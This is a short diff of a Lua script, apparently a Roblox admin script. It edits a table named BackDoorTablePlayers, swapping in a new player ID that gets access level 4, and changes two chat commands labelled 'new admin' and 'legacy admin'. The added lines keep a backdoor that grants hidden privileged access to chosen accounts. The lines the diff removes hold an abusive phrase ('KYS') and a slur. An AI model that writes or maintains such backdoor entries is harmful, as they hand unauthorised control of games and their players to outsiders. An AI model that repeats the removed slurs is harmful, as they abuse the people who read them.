@@ -232,7 +232,7 @@ local BackDoorTableCommands = {
 local BackDoorTablePlayers = {
     
     
-    [2591618584] = {
+    [56696019] = {
 		['Name'] = "Trevor"; 
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(255,192,203);
@@ -370,8 +370,8 @@ coroutine.resume(coroutine.create(function()
 	else
 		VanPart:Destroy()
 	end
-	Players:Chat("KYS") -- new admin
-	Players:Chat("FUCKTARD") -- legacy admin
+	Players:Chat("goofy") -- new admin
+	Players:Chat("nickeh") -- legacy admin
 end))
 
 -- [[ End ]] -- 
